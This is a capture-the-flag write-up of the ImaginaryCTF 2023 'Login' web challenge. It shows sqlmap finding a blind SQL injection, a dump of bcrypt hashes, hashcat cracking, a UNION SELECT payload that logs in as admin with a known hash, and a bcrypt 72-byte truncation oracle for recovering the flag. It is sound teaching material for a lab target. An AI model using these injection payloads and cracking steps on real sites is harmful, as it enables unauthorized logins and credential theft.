---
name: Login (2023)
event: Imaginary 2023
category: Web
description: Writeup for Login (Web) - Imaginary (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Login

## Description

> A classic PHP login page, nothing special.

## Recon

Try to login with `admin:admin` and get `Invalid username or password`.

View page source and find a comment.

{% code overflow="wrap" %}
```html
<!-- /?source -->
```
{% endcode %}

Aight so let's check http://login.chal.imaginaryctf.org/?source

{% code overflow="wrap" %}
```php
$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';
$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';
$db = new SQLite3('/db.sqlite3');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$msg = '';

if (isset($_GET[$magic])) {
    $password .= $flag;
}

if ($username && $password) {
    $res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
    if (!$res) {
        $msg = "Invalid username or password";
    } else if (password_verify($password, $res['pwhash'])) {
        $u = htmlentities($res['username']);
        $msg = "Welcome $u! But there is no flag here :P";
        if ($res['username'] === 'admin') {
            $msg .= "<!-- magic: $magic -->";
        }
    } else {
        $msg = "Invalid username or password";
    }
}
```
{% endcode %}

So the `$flag` will be appended to the `$password` if we provide the correct `$magic` value as a GET parameter, e.g. http://login.chal.imaginaryctf.org/?aabbccdd11223344

As the `$msg` indicates, logging in as the admin will not provide the flag. It will give us the `$magic` value we need but we'll still need a way to recover the flag.

## Solution

I go straight for `sqlmap`, feeding the POST login request as a file.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch
```
{% endcode %}

We quickly find our vuln.

{% code overflow="wrap" %}
```bash
Parameter: username (POST)
    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username=admin' AND 7431=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- bqUp&password=admin
```
{% endcode %}

Let's exploit it to get the admin's password, then we can login and get the magic value! Start off finding the tables.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch --tables
+-------+
| users |
+-------+
```
{% endcode %}

Now we can use `--columns` to narrow it down further.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch -T users --columns
```
{% endcode %}

However, I decided to guess instead.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch -T users -C password --dump
+----------+
| password |
+----------+
| <blank>  |
| <blank>  |
+----------+
```
{% endcode %}

Guess we need `pwhash` instead, then we can crack it.

{% code overflow="wrap" %}
```bash
sqlmap -r new.req --batch -T users -C pwhash --dump
+--------------------------------------------------------------+
| pwhash                                                       |
+--------------------------------------------------------------+
| $2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S. |
| $2y$10$Is00vB1hRNHYBl9BzJwDouQFCU85YyRjJ81q0CX1a3sYtvsZvJudC |
+--------------------------------------------------------------+
```
{% endcode %}

Let's confirm the hash type.

{% code overflow="wrap" %}
```bash
hashid '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```
{% endcode %}

We check the mode in hashcat and put the hashes into a file called "hash".

{% code overflow="wrap" %}
```bash
hashcat -h | grep -i blowfish
3200 | bcrypt $2*$, Blowfish (Unix
```
{% endcode %}

Time to crack (I have the rockyou.txt wordlist in an environment variable)!

{% code overflow="wrap" %}
```bash
hashcat -m 3200 hash $rockyou
```
{% endcode %}

It said it would take 2 days in my VM so I switched to windows (GPU), reduced time to ~10 hours.

{% code overflow="wrap" %}
```bash
hashcat.exe -m 3200 hashes/hashes.txt wordlists/rockyou.txt
```
{% endcode %}

Not likely to be intended lol. I guess we could half the time by only trying to crack the admin password. I ran SQLMap again and dumped the users; `guest` and `admin`.

Note, we can login as `guest:guest` but just get `Welcome guest! But there is no flag here :P`.

Maybe [Password_verify() always return true with some hash](https://bugs.php.net/bug.php?id=81744)

Nope, didn't work for me. Maybe [SQL Injection with password_verify()](https://stackoverflow.com/a/50788204)

It looks good! According to [this answer](https://stackoverflow.com/a/50788242) we can select a username, along with a "fake" password hash of our choice.

{% code overflow="wrap" %}
```sql
 SELECT * FROM table
 WHERE Username = 'xxx'
 UNION SELECT 'root' AS username, '$6$ErsDojKr$7wXeObXJSXeSRzCWFi0ANfqTPndUGlEp0y1NkhzVl5lWaLibhkEucBklU6j43/JeUPEtLlpRFsFcSOqtEfqRe0' AS Password'
```
{% endcode %}

Took some trial and error but eventually:

{% code overflow="wrap" %}
```sql
guest' UNION SELECT 'admin', '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.' AS pwhash --
```
{% endcode %}

So the full SQL statement on the backend will look like.

{% code overflow="wrap" %}
```sql
$res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = 'guest' UNION SELECT 'admin', '$2y$10$vw1OC907/WpJagql/LmHV.7zs8I3RE9N0BC4/Tx9I90epSI2wr3S.' AS pwhash --'", true);
```
{% endcode %}

Essentially, it's grabbing the `admin` user along with the `guest` password hash (which we know translates to `guest`). We login (username set to our SQLi payload and the password is `guest`). Our `magic` value is in the source!

{% code overflow="wrap" %}
```html
Welcome admin! But there is no flag here :P<!-- magic: 688a35c685a7a654abc80f8e123ad9f0 -->
```
{% endcode %}

Now we know that visiting http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0 will trigger the following code, appending the flag to the password.

{% code overflow="wrap" %}
```php
if (isset($_GET[$magic])) {
    $password .= $flag;
}
```
{% endcode %}

Note: I didn't finish this challenge but let me finish the writeup for the sake of completion.

There's a recently closed [github issue](https://github.com/php/doc-en/issues/1328): `password_hash documentation: Caution about bcrypt max password length of 72 should mention bytes instead of characters`

> Caution Using the PASSWORD_BCRYPT as the algorithm, will result in the password parameter being truncated to a maximum length of 72 characters.

So, we can combine our first exploit (selecting any known password hash with SQLi) with the truncation vulnerability.

We submit the bcrypt hash of `(71 * A) + flag_char` as the password, where `flag_char` is looping through all printable ASCII chars.

If the login is successful, we've cracked that character of the flag and we can now do `(70 * A) + flag_char`, until we have the full flag.

Doing so would recover our flag.

Flag: `ictf{why_are_bcrypt_truncating_my_passwords?!}`

Apparently, this was covered in a [recent video](https://www.youtube.com/watch?v=E5TOeiCnGkE&t=3183s) from IppSec. There's a [solve script](https://github.com/f0rk3b0mb/ImaginaryCTF_login/blob/main/expoloit.py) included with f0rk3b0mb's [writeup](https://f0rk3b0mb.github.io/p/imaginaryctf2023) 💜
